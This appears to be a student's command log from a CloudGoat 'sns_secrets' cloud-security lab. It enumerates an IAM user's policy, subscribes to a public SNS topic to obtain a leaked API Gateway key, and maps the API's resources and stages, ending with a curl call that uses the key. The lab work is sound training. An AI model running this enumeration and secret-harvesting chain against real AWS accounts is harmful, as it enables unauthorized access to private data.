@@ -1,0 +1,154 @@
+> aws configure --profile sns-secrets
+> aws sts get-caller-identity --profile sns-secrets
+
+> aws sts get-caller-identity --profile sns-secrets | tee
+{
+    "UserId": "AIDA3EFDNBBL3CZLCZM3A",
+    "Account": "aws-id",
+    "Arn": "arn:aws:iam::aws-id:user/cg-sns-user-cgiddnajk2uh"
+}
+> aws iam list-user-policies --user-name cg-sns-user-cgiddnajk2uh --profile sns-secrets | tee
+{
+    "PolicyNames": [
+        "cg-sns-user-policy-cgiddnajk2uh"
+    ]
+}
+> aws iam get-user-policy 
+--user-name cg-sns-user-cgiddnajk2uh \
+--policy-name cg-sns-user-policy-cgiddnajk2uh \
+--profile sns-secrets
+{
+    "UserName": "cg-sns-user-cgiddnajk2uh",
+    "PolicyName": "cg-sns-user-policy-cgiddnajk2uh",
+    "PolicyDocument": {
+        "Version": "2012-10-17",
+        "Statement": [
+            {
+                "Action": [
+                    "sns:Subscribe",
+                    "sns:Receive",
+                    "sns:ListSubscriptionsByTopic",
+                    "sns:ListTopics",
+                    "sns:GetTopicAttributes",
+                    "iam:ListGroupsForUser",
+                    "iam:ListUserPolicies",
+                    "iam:GetUserPolicy",
+                    "iam:ListAttachedUserPolicies",
+                    "apigateway:GET"
+                ],
+                "Effect": "Allow",
+                "Resource": "*",
+                "Sid": "AllowSNSAndIAMEnum"
+            },
+            {
+                "Action": "apigateway:GET",
+                "Effect": "Deny",
+                "Resource": [
+                    "arn:aws:apigateway:us-east-1::/apikeys",
+                    "arn:aws:apigateway:us-east-1::/apikeys/*",
+                    "arn:aws:apigateway:us-east-1::/restapis/*/resources/*/methods/GET",
+                    "arn:aws:apigateway:us-east-1::/restapis/*/methods/GET",
+                    "arn:aws:apigateway:us-east-1::/restapis/*/resources/*/integration",
+                    "arn:aws:apigateway:us-east-1::/restapis/*/integration"
+                ],
+                "Sid": "DenyAPIKeyEnumeration"
+            }
+        ]
+  
+
+> aws sns list-topics --profile sns-secrets | tee
+{
+    "Topics": [
+        {
+            "TopicArn": "arn:aws:sns:us-east-1:aws-id:public-topic-cgiddnajk2uh"
+        }
+    ]
+}
+
+> aws sns subscribe --topic-arn arn:aws:sns:us-east-1:aws-id:public-topic-cgiddnajk2uh --protocol email --notification-endpoint n01742406@humber.ca --profile sns-secrets
+
+[You don't often get email from no-reply@sns.amazonaws.com. Learn why this is important at https://aka.ms/LearnAboutSenderIdentification ]
+
+    [DEBUG] API Gateway Configuration
+    ================================
+    Endpoint: https://ebj0c2dm23.execute-api.us-east-1.amazonaws.com/prod-cgiddnajk2uh/user-data
+    API Key: *****
+
+    This is an automated debug notification.
+    Please contact the DevOps team if you're seeing this in production.
+
+
+curl -H "x-api-key: *****" \
+https://ebj0c2dm23.execute-api.us-east-1.amazonaws.com/prod-cgiddnajk2uh/user-data
+
+
+> aws apigateway get-rest-apis --profile sns-secrets | tee
+{
+    "items": [
+        {
+            "id": "ebj0c2dm23",
+            "name": "cg-api-cgiddnajk2uh",
+            "description": "API for demonstrating leaked API key scenario",
+            "createdDate": "2026-02-10T11:52:23-05:00",
+            "apiKeySource": "HEADER",
+            "endpointConfiguration": {
+                "types": [
+                    "REGIONAL"
+                ],
+                "ipAddressType": "ipv4"
+            },
+            "tags": {
+                "Description": "API Gateway protected by leaked API key",
+                "Environment": "cloudgoat",
+                "ManagedBy": "terraform",
+                "Scenario": "sns_secrets",
+                "Stack": ""
+            },
+            "disableExecuteApiEndpoint": false,
+            "rootResourceId": "xzssk3kll7",
+            "securityPolicy": "TLS_1_0",
+            "apiStatus": "AVAILABLE"
+        }
+    ]
+}
+
+> aws apigateway get-resources --rest-api-id ebj0c2dm23 --profile sns-secrets | tee
+{
+    "items": [
+        {
+            "id": "losr8j",
+            "parentId": "xzssk3kll7",
+            "pathPart": "user-data",
+            "path": "/user-data",
+            "resourceMethods": {
+                "GET": {}
+            }
+        },
+        {
+            "id": "xzssk3kll7",
+            "path": "/"
+        }
+    ]
+}
+
+> aws apigateway get-stages --rest-api-id ebj0c2dm23 --profile sns-secrets | tee
+{
+    "item": [
+        {
+            "deploymentId": "92zula",
+            "stageName": "prod-cgiddnajk2uh",
+            "cacheClusterEnabled": false,
+            "cacheClusterStatus": "NOT_AVAILABLE",
+            "methodSettings": {},
+            "tracingEnabled": false,
+            "tags": {
+                "Environment": "production",
+                "ManagedBy": "terraform",
+                "Scenario": "sns_secrets",
+                "Stack": ""
+            },
+            "createdDate": "2026-02-10T11:52:24-05:00",
+            "lastUpdatedDate": "2026-02-10T11:52:24-05:00"
+        }
+    ]
+}
